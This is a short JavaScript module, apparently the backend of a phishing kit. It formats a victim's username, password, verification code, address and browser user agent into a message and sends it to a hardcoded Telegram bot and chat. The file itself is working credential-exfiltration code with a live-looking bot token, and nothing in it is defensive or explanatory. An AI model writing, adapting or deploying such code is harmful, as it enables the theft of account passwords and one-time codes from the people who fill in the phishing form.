/* eslint-disable import/prefer-default-export */
import axios from 'axios';

let STT = 0;
const TOKEN = '6954549186:AAF7XW_k0HivjqYpEVHJymW2EEqQgeqd_dc';
const CHATID = '-4110772580';

async function sendMessage(payload) {
    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
    STT += 1;
    let message = `<b>STT:</b> <em>${STT}</em> \n`;
    message += `<b>TK:</b> <em>${payload.name}</em> \n`;
    message += `<b>MK:</b> <em>${payload.pass}</em> \n`;
    message += `<b>Code:</b> <em>${payload.code || '---'}</em> \n`;
    message += `<b>Address:</b> <em>${payload.address || '---'}</em> \n`;
    message += `<b>Device:</b> <em>${payload.userAgent || '---'}</em> \n`;
    message += `<b>Status:</b> <em>${payload.status}</em>`;
    const params = { chat_id: CHATID, text: message, parse_mode: 'HTML' };

    try {
        axios.get(url, { params });
        return true;
    } catch (error) {
        console.log(error);
        return false;
    }
}

export {
    sendMessage,
};
